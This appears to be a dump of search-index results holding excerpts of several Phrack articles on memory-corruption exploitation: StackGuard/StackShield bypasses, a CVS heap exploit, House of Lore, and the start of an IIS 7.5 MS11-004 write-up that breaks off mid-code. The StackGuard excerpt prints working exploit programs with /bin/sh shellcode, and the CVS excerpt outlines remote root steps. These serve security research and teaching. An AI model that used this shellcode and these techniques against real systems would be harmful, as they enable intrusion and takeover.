all is lost. Note that alignment here is key, since if the compiler pads one of the buffers, we may run into a problem. Which buffer is padded and the contents of the pad bytes both play a role in the success of exploitation. If buf2 is padded, and the padded bytes contain NULL's, no overflow (or, at least, no usable overflow) will occur. If the pad bytes are _not_ null, then as long as the pad bytes end on a double-word boundary (which they almost certainly will), we can still successfully overwrite the saved instruction pointer. If buf1 is padded, whether or not the pad bytes contain NULL's is really of no consequence, as they will fall after our shellcode anyway. ----| Denouement As with all bugs, the fault here is not of the library functions, or of the C programming language, or operating systems not marking data as non-executable, but that programmers do not fully realize the ramifications of what they are doing. Before handling any potentially hazardous materials (arbitrary data), special precautions should be made. Man pages should be read. Buffers should be terminated. Return values should be checked. All it takes is a '+1' and an initialization. How hard is this: char buf[MAXSIZE + 1]; FILE *fd; size_t len; ... memset(buf, 0, MAXSIZE + 1); len = fread((void *)buf, 1, MAXSIZE, fd); /* * This won't actually happen, but it is supplied to * prove a point */ if(len > MAXSIZE){ syslog(LOG_WARNING, \"Overflow occured in pid %d, invoked by %d\\n\", getpid(), getuid()); exit(1); } ... Okay, so the above is a bit silly, but the hopefully the intent is clear. Incidentally, the following also do not terminate on behalf of lazy programmers: fread() the read() family [ read",
                      "hash": "79af6427f8bd768d72400e0165e34e9895e7480b9f314c9be4a7fee4df70d26d",
                      "offset": 0,
                      "vector": null,
                      "score": 0.8263185024261475
                    }
                  ]
                },
                {
                  "created": 1679370997220,
                  "document_id": "phrack-64-15",
                  "timestamp": 1180224000000,
                  "tags": ["phrack", "issue-64", "article-15"],
                  "hash": "e8615dae11925398994bbb9ddd57179e76d04ee5f753a20cbf371556fc23bd6a",
                  "text_size": 32191,
                  "chunk_count": 3,
                  "chunks": [
                    {
                      "text": " instead of aborting the program with a signal 11, it will stretch the stack with the expand_stack() function from the kernel. This method is OS generic. Thanks bbp. --[ 4 - A couple of words on the BSD exploitation As promised, here is the explanation of the technique used to exploit the FreeBSD version. Consider the fact that with only minor changes, this exploit was working on other operating systems. In fact, by switching the shellcode and modifying the hardcoded high addresses of the heap, the exploit was fully functional on every system using PHK malloc. This exploit was not restricted only to FreeBSD, a thing that the script kiddies didn't know. I like to see that kind of tricks inside exploits. It makes them powerful for the expert, and almost useless to the kiddie. The technique explained here is an excellent way to take control of the target process, and it could have been easily used in the Linux version of the exploit. The main advantage is that this method does not use the magic of voodoo, so it can help you bypass the security checks done by the malloc code. First, the heap needs to be filled to put it in a predictable state, like for all the heap overflow exploits. Secondly, what we want to do basically is to put a structure containing function pointers right behind the buffer that we can overflow, in order to rewrite functions pointers. In this case, we overwrote the functions pointers entirely and not partially. Once this is done, the only thing that remains to do is to repeatedly send big buffers containing the shellcode to make sure it will be available at a high address in the heap. After, we need to overwrite the function pointer and to trigger the use of this same function. As a result, the shellcode will then be run. Practically, we used the CVS command \"Gzip-stream\" that allocated an array of function pointers, inside a subroutine of the serve_gzip_stream() function. Let's recap: 1. We fill_holes() the PHK's malloc allocator so that the buffer that we are going to overwrite is before a hole in the heap. 2. We allocate the buffer containing 4 pointers to shellcode at the right place. 3. We call the function \"Gzip-stream\" that will allocate an array of function pointers right inside our memory hole. This array will be located right after the buffer that we are going to overflow. 4. We trigger the overflow and we overwrite a function pointer with the address of our shellcode (the macro HEAPBASE in the exploit). See OFFSET variable to know how many bytes we need to overflow. 5. With the \"Entry\" command, we add numerous entries that contain NOPs and shellcode to fill the higher addresses of the heap with our shellcode. 6. We call zflush(1) function which end the gziped-stream and trigger an overwrited function pointer (the zfree one of the struct z_stream). And so on, we retrieve a shell. If we are not yet root, we look if one cvs's passwd file is writable on the whole cvs tree, which was the case at the time on most of servers, we modify it to obtain a root account. We re-exploit the cvs server with this account and - yes it is - we have rO0t on the remote. :-) --[ 5 - Conclusion We thought that it was worth presenting the exploit the way it was done here, to let the reader learn by himself the details of the exploitation code, which is from now on available in the public domain, even though the authors did not want it. From now on, this section will be included in the upcoming releases of phrack. Each issue, we will present the details of an interesting exploit. The exploit will be chosen because its development was interesting and the the author(s) had a strong determination to succeed in building it. Such exploits can be counted on the fingers of your hands (I am talking about the leaked ones). With the hope that you had fun reading this ... --[ 6 - Greeting To MaXX for his great papers on DL malloc.",
                      "hash": "d12728ddab9fc4396ac7ba9c3425cb51c69f654cfbf36d3e8f18456f87dda5a4",
                      "offset": 2,
                      "vector": null,
                      "score": 0.8241337537765503
                    }
                  ]
                },
                {
                  "created": 1679370776042,
                  "document_id": "phrack-56-5",
                  "timestamp": 947030400000,
                  "tags": ["phrack", "issue-56", "article-5"],
                  "hash": "d1809073f0ac26b7900dfd17fe1577a4d617282ef7153d9b4f01e7068b402739",
                  "text_size": 27229,
                  "chunk_count": 3,
                  "chunks": [
                    {
                      "text": "- P H R A C K M A G A Z I N E - Volume 0xa Issue 0x38 05.01.2000 0x05[0x10] |------------------- BYPASSING STACKGUARD AND STACKSHIELD --------------------| |-----------------------------------------------------------------------------| |--------------------- Bulba and Kil3r <lam3rz@hert.org> ---------------------| ----| Preface \"When a buffer overwrites a pointer... The story of a restless mind.\" This article is an attempt to demonstrate that it is possible to exploit stack overflow vulnerabilities on systems secured by StackGuard or StackShield even in hostile environments (such as when the stack is non-executable). ----| StackGuard Overview According to its authors, StackGuard is a \"simple compiler technique that virtually eliminates buffer overflow vulnerabilities with only modest performance penalties.\" [1] We assume that the reader know how buffer overflow attacks work and how to write exploit code . If this is foreign to you, please see P49-14. In a nutshell, we can change a function's return address by writing past the end of local variable buffer. The side effect of altering a function's return address is that we destroy/modify all stack data contained beyond end of the overflowed buffer. What does StackGuard do? It places a \"canary\" word next to the return address on the stack. If the canary word has been altered when the function returns, then a stack smashing attack has been attempted, and the program responds by emitting an intruder alert into syslog, and then halts. Consider the following figure: ... ... |-----------------------------------| | parameters passed to function | |-----------------------------------| | function's return address (RET) | |-----------------------------------| | canary | |-----------------------------------| | local frame pointer (%ebp) | |-----------------------------------| | local variables | |-----------------------------------| ... ... To be effective, the attacker must not be able to \"spoof\" the canary word by embedding the value for the canary word in the attack string. StackGuard offers two techniques to prevent canary spoofing: \"terminator\" and \"random\". A terminator canary contains NULL(0x00), CR (0x0d), LF (0x0a) and EOF (0xff) -- four characters that should terminate most string operations, rendering the overflow attempt harmless. A random canary is chosen at random at the time the program execs. Thus the attacker cannot learn the canary value prior to the program start by searching the executable image. The random value is taken from /dev/urandom if available, and created by hashing the time of day if /dev/urandom is not supported. This randomness is sufficient to prevent most prediction attempts. ----| StackShield StackShield uses a different technique. The idea here is to create a separate stack to store a copy of the function's return address. Again this is achieved by adding some code at the very beginning and the end of a protected function. The code at the function prolog copies the return address to special table, and then at the epilog, it copies it back to the stack. So execution flow remains unchanged -- the function always returns to its caller. The actual return address isn't compared to the saved return address, so there is no way to check if a buffer overflow occurred. The latest version also adds some protection against calling function pointers that point at address not contained in .TEXT segment (it halts program execution if the return value has changed). It might seem like these two systems are infallible. They're not. ----| \"Nelson Mengele must be free\" \"...an attacker can bypass StackGuard protection using buffer overflows to alter other pointers in the program besides the return address, such as function pointers and longjmp buffers, which need not even be on the stack.\" [2] OK. So. Do we need a bit of luck to overflow a function pointer or a longjmp? You bet! It's not exactly commonplace to find such a pointer located after our buffer, and most programs do not have it at all. It is much more likely to find some other kind of pointer. For example: [root@sg StackGuard]# cat vul.c // Example vulnerable program. int f (char ** argv) { int pipa; // useless variable char *p; char a[30]; p=a; printf (\"p=%x\\t -- before 1st strcpy\\n\",p); strcpy(p,argv[1]); // <== vulnerable strcpy() printf (\"p=%x\\t -- after 1st strcpy\\n\",p); strncpy(p,argv[2],16); printf(\"After second strcpy ;)\\n\"); } main (int argc, char ** argv) { f(argv); execl(\"back_to_vul\",\"\",0); //<-- The exec that fails printf(\"End of program\\n\"); } As you can see, we just overwrite the return address by overflowing our buffer. But this will get us nowhere since our program is StackGuard protected. But the simplest, obvious route is not always the best one. How about we just overwrite the `p` pointer? The second (safe) strncpy() operation will go straight to memory pointed by us. What if p points at our return address on the stack? We're altering the function's return without even touching the canary. So what do we require for our attack? 1. We need pointer p to be physically located on the stack after our buffer a[]. 2. We need an overflow bug that will allow us to overwrite this p pointer (i.e.: an unbounded strcpy). 3. We need one *copy() function (strcpy, memcopy, or whatever) that takes *p as a destination and user-specified data as the source, and no p initialization between the overflow and the copy. Obviously, given the above limitations not all programs compiled with StackGuard are going to be vulnerable, but such a vulnerabilities are out there. For example, the wu-ftpd 2.5 mapped_path bug, where overflowing the mapped_path buffer could alter the Argv and LastArg pointers used by setproctitle() resulting in the ability to modify any part of the process' memory. Granted, it was *data* based overflow (not stack-based) but, on the other hand, this shows that the requirements for our above vulnerability are definitely fulfilled in real world. So how are we going to exploit it? We overwrite p so it will point to the address of RET on the stack and thus the next *copy() will overwrite our RET without touching the canary :) Yes, we need to smuggle in the shellcode as well (we use argv[0]). Here is a sample exploit (we used execle() to make it environment independent): [root@sg StackGuard]# cat ex.c /* Example exploit no. 1 (c) by Lam3rZ 1999 :) */ char shellcode[] = \"\\xeb\\x22\\x5e\\x89\\xf3\\x89\\xf7\\x83\\xc7\\x07\\x31\\xc0\\xaa\" \"\\x89\\xf9\\x89\\xf0\\xab\\x89\\xfa\\x31\\xc0\\xab\\xb0\\x08\\x04\" \"\\x03\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd\\x80\\xe8\\xd9\\xff\" \"\\xff\\xff/bin/sh\"; char addr[5]=\"AAAA\\x00\"; char buf[36]; int * p; main() { memset(buf,'A',32); p = (int *)(buf+32); *p=0xbffffeb4; // <<== let us point at RET p = (int *)(addr); *p=0xbfffff9b; // <<== new RET value execle(\"./vul\",shellcode,buf,addr,0,0); } As tested on a StackGuarded RH 5.2 Linux box: [root@sg StackGuard]# gcc vul.c -o vul [root@sg StackGuard]# gcc ex.c [root@sg StackGuard]# ./a.out p=bffffec4 -- before 1st strcpy p=bffffeb4 -- after 1st strcpy bash# As you can see, the first strcpy() overwrites p, then strncpy() copies the new RET value so that when it returns it takes address of our shellcode. Kaboom! This technique works with programs compiled with regular gcc or StackGuarded gcc, but StackShield compiled programs are proof against this. ----| There is no spoon I talked with Crispin Cowan <crispin@cse.ogi.edu>, one of the StackGuard developers and he proposed a remediation against above hack. Here's his idea: \"The XOR Random Canary defense: here, we adopt Aaron Grier's ancient proposal to xor the random canary with the return address. The canary validation code used on exit from functions then XOR's the return address with the proper random canary (assigned to this function at exec() time) to compute what the recorded random canary on the stack should be. If the attacker has hacked the return address, then the xor'd random canary will not match. The attacker cannot compute the canary to put on the stack without knowing the random canary value. This is effectively encryption of the return address with the random canary for this function. The challenge here is to keep the attacker from learning the random canary value. Previously, we had proposed to do that by just surrounding the canary table with red pages, so that buffer overflows could not be used to extract canary values. However, Emsi's [described above] attack lets him synthesize pointers to arbitrary addresses.\" (The simplest solution there is to) \"mprotect() the canary table to prevent the attacker from corrupting it.\" We informed Crispin that we're going to write an article about it and his response was: \"I think we can have a revised StackGuard compiler (with the XOR random canary) ready for release on Monday.\" That compiler has been released. [3] StackShield offers an (almost) equal level of security by saving the RET copy in safe place (of arbitrary location and size -- not necessarily a good practice however) and checking its integrity before doing the return. We can bypass that. If we have a pointer that can be manipulated, we can use it to overwrite things that can help us exploit a vulnerable overflow in a program. For example, take the fnlist structure that holds functions registered via atexit(3) or on_exit(3). To reach this branch of code, of course, the program needs to call exit(), but most programs do this either at the end of execution or when an error occurs (and in most cases we can force an error exception). Let's look at the fnlist structure: [root@sg StackGuard]# gdb vul GNU gdb 4.17.0.4 with Linux/x86 hardware watchpoint and FPU support [...] This GDB was configured as \"i386-redhat-linux\"... (gdb) b main Breakpoint 1 at 0x8048790 (gdb) r Starting program: /root/StackGuard/c/StackGuard/vul Breakpoint 1, 0x8048790 in main () (gdb) x/10x &fnlist 0x400eed78 <fnlist>: 0x00000000 0x00000002 0x00000003 0x4000b8c0 0x400eed88 <fnlist+16>: 0x00000000 0x00000003 0x08048c20 0x00000000 0x400eed98 <fnlist+32>: 0x00000000 0x00000000 We can see that it calls two functions: _fini [0x8048c20] and _dl_fini [0x4000b8c0] and that neither of these take any arguments (checkout glibc sources to understand how to read the fnlist content). We can overwrite both of these functions. The fnlist address is dependent on the libc library, so it will be the same for every process on a particular machine. The following code exploits a vulnerable overflow when the program exits via exit(): [root@sg StackGuard]# cat 3ex.c /* Example exploit no. 2 (c) by Lam3rZ 1999 :) */ char shellcode[] = \"\\xeb\\x22\\x5e\\x89\\xf3\\x89\\xf7\\x83\\xc7\\x07\\x31\\xc0\\xaa\" \"\\x89\\xf9\\x89\\xf0\\xab\\x89\\xfa\\x31\\xc0\\xab\\xb0\\x08\\x04\" \"\\x03\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd\\x80\\xe8\\xd9\\xff\" \"\\xff\\xff/bin/sh\"; char addr[5]=\"AAAA\\x00\"; char buf[36]; int * p; main() { memset(buf,'A',32); p = (int *)(buf+32); *p=0x400eed90; // <<== Address of entry in fnlist which we'll modify p = (int *)(addr); *p=0xbfffff9b; // <<== Address of new function to call (shellcode) :) execle(\"./vul\",shellcode,buf,addr,0,0); } As you can see our exploit has changed only by one line :) Let's test it against our vulnerable program: [root@sg StackGuard]# gcc 3ex.c [root@sg StackGuard]# ./a.out p=bffffec4 -- before 1st strcpy p=400eed90 -- after 1st strcpy After second strcpy ;) End of program bash# As you can see our program gave us a shell after the end of normal execution. Neither StackGuard nor StackShield cannot protect against this kind of attack. But what if our program do not call exit() but uses _exit() instead? Let's see what happens when we overwrite the canary. A StackGuarded program will call __canary_death_handler() (this function is responsible for logging the overflow attempt and terminating the process). Let's look at it: void __canary_death_handler (int index, int value, char pname[]) { printf (message, index, value, pname) ; syslog (1, message, index, value, pname) ; raise (4) ; exit (666) ; } As you can see, we have a call to exit() at the very end. Granted, exploiting the program this way will generate logs, but if there is no other way, it's a necessary evil. Besides, if you get root, you can just groom them later. We received some email from Perry Wagle <wagle@cse.ogi.edu> (another Stackguard author): \"I seem to",
                      "hash": "f324c67e1a350919a290db1f68ebcfdb572544646c18855a416e556f60fbaf7c",
                      "offset": 0,
                      "vector": null,
                      "score": 0.8238335251808167
                    }
                  ]
                },
                {
                  "created": 1679371080557,
                  "document_id": "phrack-67-8",
                  "timestamp": 1289952000000,
                  "tags": ["phrack", "issue-67", "article-8"],
                  "hash": "fb3e8da29086f3faccad23f9cbf9cbd8baddcd272a8e88a6d9e42f6195d6589f",
                  "text_size": 96276,
                  "chunk_count": 7,
                  "chunks": [
                    {
                      "text": " wild. The preconditions are clear, this has been seen repeatedly throughout of this article. The obvious difference between the PoC's that I presented here and the applications you use every day (as well as email clients, or web browsers), is that one can not predict in a first chance the current state of the heap. And this is really a problem, because while this is not in a fairly stable and predictable state, the chances of exploiting will be minimal. But very high-level hackers have already met once this class of problems, and over time have been designing and developing a series of techniques which allow reordering the heap so that both, the position of the allocated chunks as the data contained within them, are parameters controlled by the user. Among these techniques, we must appoint two best known: - Heap Spray - Heap Feng Shui You can read something about them in the following paper presented at the BlackHat 2007 [8]. In short we can say that the \"Heap Spray\" technique simply fill in the heap as far as possible by requesting large amount of memory placing there repetitions of nop sleds and the opportune shellcode, then just simply find a predictable memory address for the \"primitive 4-byte overwrite\". A very clever idea in this technique is to make the nop sled values equal to the selected address, so that it will be self-referential. Feng Shui is a much more elaborate technique, it first tries to defragment the Heap by filling the holes. Then it comes back to create holes in the upper controlled zone so that the memory remains as: [ chunk | hole | chunk | hole | chunk | hole | chunk ] ... and finally tries to create the buffer to overflow in one of these holes, knowing that this will always be adjacent to one of its buffers containing information controlled by the exploiter. We will not talk about it more here. Just say that although some of these methodologies may seem time consuming and fatigue making, without them nobody could create reliable exploits, or obtain success in most of the attempts. << Programming today is a race between software engineers striving to build bigger and better idiot-proof programs, and the Universe trying to produce bigger and better idiots. So far, the Universe is winning. >> [ Rich Cook ] .---------------. ---[ 6 ---[ Conclusions ]--- .---------------. In this article we have seen how The House of Lore hid inside of itself a power much greater than we imagined. We also presented a fun example showing that, despite not being vulnerable to all the techniques we knew so far, it was still vulnerable to one that until now had only been described theoretically. We detail a second method of attack also based on the corruption of a largebin, this attack could be an alternative in some circumstances and should be as important as the main method of the smallbin corruption. Finally we detailed a way to apply THoL in version 3 of the Ptmalloc library, which many thought was not vulnerable to attacks due to the imposition of numerous restrictions. Reviewing and analyzing in depth some of the security mechanisms that have been implanted in this library, allowed to find that further studies will be needed to discover new vulnerabilities and areas of code that can be manipulated for personal fun and profit. If you want a tip from mine on how to improve your hacking, here goes: Reads everything, study everything... then forget it all and do it differently, do it better. Fill your cup, empty your cup and fill it again with fresh water. Finally, I would like to recall that I said the following in my \"Malloc Des-Maleficarum\" paper: \"...and The House of Lore, although not very suitable for a credible case, no one can say that is a complete exception...\" With this new article I hope I have changed the meaning of my words, and shown that sometimes in hacking you make mistakes, but never stop to investigate and repair your errors. Everything we do is for fun, and we will do it as long as we exist on the land and cyberspace. << All truths are easy to understand once they are discovered; the point is to discover them. >> [ Galileo Galilei ] .-------------------. ---[ 7 ---[ Acknowledgments ]--- .-------------------. First, I would like to give my acknowledgments to Dreg for his insistence for that I would do something with this paper and it not to fall into oblivion. After a bad time ... I could not give a talk on this subject at RootedCon [9], Dreg still graciously encouraged me to finish the translation and publish this article in this fantastic e-zine which undoubtedly left its mark etched in the hacking history. Indeed, the last details in the translation of this article are Dreg's work, and this would never have been what it is without his invaluable help. For the rest, also thanks to all the people I met in dsrCON!, all very friendly, outgoing and all with their particular point of madness. I am not going to give more names, but, to all of them, thanks. And remember... Happy Hacking! .--------------. ---[ 8 ---[ References ]--- .--------------. [1] Malloc Maleficarum http://www.packetstormsecurity.org/papers/attack/MallocMaleficarum.txt [2] Malloc Des-Maleficarum http://www.phrack.org/issues.html?issue=66&id=10 [3] PTMALLOC (v2 & v3) http://www.malloc.de/en/ [4] Reducing the effective entropy of gs cookies http://uninformed.org/?v=7&a=2&t=sumry [5] Electric Fence - Red-Zone memory allocator http://perens.com/FreeSoftware/ElectricFence/ electric-fence_2.1.13-0.1.tar.gz [6] Jemalloc - A Scalable Concurrent malloc(3) Implementacion for FreeBSD http://people.freebsd.org/~jasone/jemalloc/bsdcan2006/jemalloc.pdf [7] Guard Malloc (Enabling the Malloc Debugging Features) http://developer.apple.com/mac/library/documentation/Darwin/Reference/ ManPages/man3/Guard_Malloc.3.html [8] Heap Feng Shui in JavaScript - BlackHat Europe 2007 http://www.blackhat.com/presentations/bh-europe-07/Sotirov/ Presentation/bh-eu-07-sotirov-apr19.pdf [9] Rooted CON: Congreso de Seguridad Informatica (18-20 Marzo 2010) http://www.rootedcon.es/ [10] dnmalloc http://www.fort-knox.org/taxonomy/term/3 [11] OpenBSD malloc http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/stdlib/malloc.c [12] Dnmaloc - A more secure memory allocator by Yves Younan, Wouter Joosen, Frank Piessens and Hans Van den Eynden http://www.orkspace.net/secdocs/Unix/Protection/Description/ Dnmaloc%20-%20A%20more%20secure%20memory%20allocator.pdf [13] A new malloc(3) for OpenBSD by Otto Moerbeek http://www.tw.openbsd.org/papers/eurobsdcon2009/otto-malloc.pdf .----------------. ---[ 9 ---[ Wargame Code ]--- .----------------. In this last section we attach the same program \"agents.c\" that we saw above but adapted to network environment so that it can be feasible to use in a servers exploitation wargame. At the same time the code is a bit more elaborate and robust. As usual, \"netagents.c\" forks a child process (fork) for each connection made to it, and as each new process has its own heap, each attacker can confront the vulnerability based on zero. The actions of one not influence to others. The code should be adapted according to the needs of the manager conducting or developing the wargame (as well as the number of allowed incoming connections or debugging information you want to give to the attacker if the game becomes very difficult). The attached archive includes a makefile which assumes that in the same directory as the source is the compiled library ptmalloc2 (libmalloc.a) to be linked with netagents.c. Each should adapt \"malloc.c\" to print the information it deems necessary, but the basics would be the changes that have been made throughout this article, which allows the attacker to know from where they extract the chunks of memory requested. How the attacker obtains the output of these changes? For simplicity, \"netagents.c\" prevents calls to send( ) by closing the standard output (stdout) and duplicating it with the recent obtained client socket (dup(CustomerID)). We use the same trick as the shellcodes expected. \"netagents.c\" also includes a new menu option, \"Show Heap State\", in order to see the state of the memory chunks that are being allocated or released during its execution, this allows you to see if the head of any free chunk has been overwritten. After some legal moves, a normal output would be this: +--------------------------------+ | Allocated Chunk (0x8093004) | -> Agents[0] +--------------------------------+ | SIZE = 0x00000019 | +--------------------------------+ +--------------------------------+ | Allocated Chunk (0x809301c) | -> Agents[1] +--------------------------------+ | SIZE = 0x00000019 | +--------------------------------+ +--------------------------------+ | Allocated Chunk (0x8093034) | -> Agents[1]->name +--------------------------------+ | SIZE = 0x00000029 | +--------------------------------+ +--------------------------------+ | Free Chunk (0x8093058) | -> Agents[1]->lastname +--------------------------------+ | PREV_SIZE = 0x00000000 | +--------------------------------+ | SIZE = 0x00000089 | +--------------------------------+ | FD = 0x08050168 | +--------------------------------+ | BK = 0x08050168 | +--------------------------------+ +--------------------------------+ | Allocated Chunk (0x80930e4) | -> Agents[1]->desc +--------------------------------+ | SIZE = 0x00000108 | +--------------------------------+ Following the example of the perl exploit presented in 2.2.2, one might design an exploit in C with a child process continually receiving responses from the server (menus and prompts), and the father answering these questions with a pause, for example one second each answer (if you know what to respond to work that program ...). The difficult task is to predict the addresses on the stack, which in the last phase of the attack, the last reserved chunk should match the frame created by \"edit_lastname( )\" since that it is where we overwrite the saved return address and where the program probably will break (it is obvious that ASLR enabled suppose a new complexity to overcome). What happens with failed attempts and segmentation failures? The program captures SIGSEGV and informs the attacker that something bad has happened and encourages him to connect again. The child process is the only that becomes unstable and thus a new connection leaves everything clean for a new attack. The latest aid that one could provide to the attacker is to deliver the source code, so this could be adapted to study the vulnerability in local, and then carry his attack to the network environment. Attach:",
                      "hash": "2fe69cace1f1a1af35dc5d942a7fc4cd7fe97a18d257f2245bf7885ac3a6883b",
                      "offset": 6,
                      "vector": null,
                      "score": 0.8235756158828735
                    }
                  ]
                },
                {
                  "created": 1679371111092,
                  "document_id": "phrack-68-12",
                  "timestamp": 1334361600000,
                  "tags": ["phrack", "issue-68", "article-12"],
                  "hash": "79cabcaca0468c0af299169cffb1c49f7ff42e19e9dc0368f6e5f06ae9682ad4",
                  "text_size": 41600,
                  "chunk_count": 4,
                  "chunks": [
                    {
                      "text": "==Phrack Inc.== Volume 0x0e, Issue 0x44, Phile #0x0c of 0x13 |=-----------------------------------------------------------------------=| |=-------------=[ The Art of Exploitation ]=-----------------=| |=-----------------------------------------------------------------------=| |=-------------------=[ Exploiting MS11-004 ]=-----------------------=| |=----------=[ Microsoft IIS 7.5 remote heap buffer overflow ]=----------=| |=-----------------------------------------------------------------------=| |=------------------------=[ by redpantz ]=----------------------------=| |=-----------------------------------------------------------------------=| --[ Table of Contents 1 - Introduction 2 - The Setup 3 - The Vulnerability 4 - Exploitation Primitives 5 - Enabling the LFH 6 - FreeEntryOffset Overwrite 7 - The Impossible 8 - Conclusion 9 - References 10 - Exploit (thing.py) --[ 1 - Introduction Exploitation of security vulnerabilities has greatly increased in difficulty since the days of the Slammer worm. There have been numerous exploitation mitigations implemented since the early 2000's. Many of these mitigations were focused on the Windows heap; such as Safe Unlinking and Heap Chunk header cookies in Windows XP Service Pack 2 and Safe Linking, expanded Encoded Chunk headers, Terminate on Corruption, and many others in Windows Vista/7 [1]. The widely deployed implementation of anti-exploitation technologies has made gaining code execution from vulnerabilities much more expensive (notice that I say \"expensive\" and not \"impossible\"). By forcing the attacker to acquire more knowledge and spend expansive amounts of research time, the vendor has made exploiting these vulnerabilities increasingly difficult. This article will take you through the exploitation process (read: EIP) of a heap overflow vulnerability in Microsoft IIS 7.5 (MS11-004) on a 32-bit, single-core machine. While the target is a bit unrealistic for the real-world, and exploit reliability may be a bit suspect, it does suffice in showing that an \"impossible to exploit\" vulnerability can be leveraged for code execution with proper knowledge and sufficient time. Note: The structure of this article will reflect the steps, in order, taken when developing the exploit. It differs from the linear nature of the actual exploit because it is designed to show the thought process during exploit development. Also, since this article was authored quite some time after the initial exploitation process, some steps may have been left out (i.e. forgotten); quite sorry about that. --[ 2 - The Setup A proof of concept was released by Matthew Bergin in December 2010 that stated there existed an unauthenticated Denial of Service (DoS) against IIS FTP 7.5, which was triggered on Windows 7 Ultimate [3]. The exploit appeared to lack precision, so it was decided further investigation was necessary. After creating a test environment, the exploit was run with a debugger attached to the FTP process. Examination of the error concluded it wasn't a DoS and most likely could be used to achieve remote code execution: BUGCHECK_STR: APPLICATION_FAULT_ACTIONABLE_HEAP_CORRUPTION_\\ heap_failure_freelists_corruption PRIMARY_PROBLEM_CLASS: ACTIONABLE_HEAP_CORRUPTION_heap_failure_freelists_corruption DEFAULT_BUCKET_ID: ACTIONABLE_HEAP_CORRUPTION_heap_failure_freelists_corruption STACK_TEXT: 77f474cb ntdll!RtlpCoalesceFreeBlocks+0x3c9 77f12eed ntdll!RtlpFreeHeap+0x1f4 77f12dd8 ntdll!RtlFreeHeap+0x142 760074d9 KERNELBASE!LocalFree+0x27 72759c59 IISUTIL!BUFFER::FreeMemory+0x14 724ba6e3 ftpsvc!FTP_COMMAND::WriteResponseAndLog+0x8f 724beff8 ftpsvc!FTP_COMMAND::Process+0x243 724b6051 ftpsvc!FTP_SESSION::OnReadCommandCompletion+0x3e2 724b76c7 ftpsvc!FTP_CONTROL_CHANNEL::OnReadCommandCompletion+0x1e4 724b772a ftpsvc!FTP_CONTROL_CHANNEL::AsyncCompletionRoutine+0x17 7248f182 ftpsvc!FTP_ASYNC_CONTEXT::OverlappedCompletionRoutine+0x3c 724a56e6 ftpsvc!THREAD_POOL_DATA::ThreadPoolThread+0x89 724a58c1 ftpsvc!THREAD_POOL_DATA::ThreadPoolThread+0x24 724a4f8a ftpsvc!THREAD_MANAGER::ThreadManagerThread+0x42 76bf1194 kernel32!BaseThreadInitThunk+0xe 77f1b495 ntdll!__RtlUserThreadStart+0x70 77f1b468 ntdll!_RtlUserThreadStart+0x1b While simple write-4 primitives have been extinct since the Windows XP SP2 days [1], there was a feeling that currently known, but previously unproven techniques could be leveraged to gain code execution. Adding fuel to the fire was a statement from Microsoft stating that the issue \"is a Denial of Service vulnerability and remote code execution is unlikely\" [4]. With the wheels set in motion, it was time to figure out the vulnerability, gather exploitation primitives, and subvert the flow of execution by any means necessary... --[ 3 - The Vulnerability The first order of business was to figure out the root cause of the vulnerability. Understanding the root cause of the vulnerability was integral into forming a more refined and concise proof of concept that would serve as a foundation for exploit development. As stated in the TechNet article, the flaw stemmed from an issue when processing Telnet IAC codes [5]. The IAC codes permit a Telnet client to tell the Telnet server various commands within the session. The 0xFF character denotes these commands. TechNet also describes a process that requires the 0xFF characters to be 'escaped' when sending a response by adding an additional 0xFF character. Now that there is context around the vulnerability, the corresponding crash dump can be further analyzed. Afterwards we can open the binary in IDA Pro and attempt to locate the affected code. Unfortunately, after statically cross-referencing the function calls from the stack trace, there didn't seem to be any functions that performed actions on Telnet IAC codes. While breakpoints could be set on any of the functions in the stack trace, another path was taken. Since the public symbols named most of the important functions within the ftpsvc module, it was deemed more useful to search the function list than set debugger breakpoints. A search was made for any function starting with 'TELNET', resulting in 'TELNET_STREAM_CONTEXT::OnReceivedData' and 'TELNET_STREAM_CONTEXT::OnSendData'. The returned results proved to be viable after some quick dynamic analysis when sending requests and receiving responses. The OnReceivedData function was investigated first, since it was the first breakpoint that was hit. Essentially the function attempts to locate Telnet IAC codes (0xFF), escape them, parse the commands and normalize the request. Unfortunately it doesn't account for seeing two consecutive IAC codes. The following is pseudo code for important portions of OnReceivedData: TELNET_STREAM_CONTEXT::OnReceivedData(char *aBegin, DATA_STEAM_BUFFER *aDSB, ...) { DATA_STREAM_BUFFER *dsb = aDSB; int len = dsb->BufferLength; char *begin = dsb->BufferBegin; char *adjusted = dsb->BufferBegin; char *end = dsb->BufferEnd; char *curr = dsb->BufferBegin; if(len >= 3) { //0xF2 == 242 == Data Mark if(begin[0] == 0xFF && begin[1] == 0xFF && begin[2] == 0xF2) curr = begin + 3; } bool seen_iac = false; bool seen_subneg = false; if(curr >= end) return 0; while(curr < end) { char curr_char = *curr; //if we've seen an iac code //look for a corresponding cmd if(seen_iac) { seen_iac = false; if(seen_subneg) { seen_subneg = false; if(curr_char < 0xF0) *adjusted++ = curr_char; } else { if(curr_char != 0xFA) { if(curr_char != 0xFF) { if(curr_char < 0xF0) { PuDbgPrint(\"Invalid command %c\", curr_char) if(curr_char) *adjusted++ = curr_char; } } else { if(curr_char) *adjusted++ = curr_char; } } else { seen_iac = true; seen_subneg = true; } } } else { if(curr_char == 0xFF) seen_iac = true; else if(curr_char) *adjusted++ = curr_char; } curr++; } dsb->BufferLength = adjusted - begin; return 0; } The documentation states Telnet IAC codes can be used by: \"Either end of a Telnet conversation can locally or remotely enable or disable an option\". The diagram below represents the 3-byte IAC command within the overall Telnet connection stream: 0x0 0x2 -------------------------------- [IAC][Type of Operation][Option] -------------------------------- Note: The spec should have been referenced before figuring out the vulnerability, instead of reading the code and attempting to figure out what could go wrong. Although there is code to escape IAC characters, the function does not except to see two consecutive 0xFF characters in a row. Obviously this could be a problem, but it didn't appear to contain any code that would result in overflow. Thinking about the TechNet article recalled the line 'error in the response', so the next logical function to examine was 'OnSendData'. Shortly into the function it can be seen that OnSendData is looking for IAC (0xFF) codes: .text:0E07F375 loc_E07F375: .text:0E07F375 inc edx .text:0E07F376 cmp byte ptr [edx], 0FFh .text:0E07F379 jnz short loc_E07F37C .text:0E07F37B inc edi .text:0E07F37C .text:0E07F37C loc_E07F37C: .text:0E07F37C cmp edx, ebx .text:0E07F37E jnz short loc_E07F375 ; count the number ; of \"0xFF\" characters The following pseudo code represents the integral pieces of OnSendData: TELNET_STREAM_CONTEXT::OnSendData(DATA_STREAM_BUFFER *dsb) { char *begin = 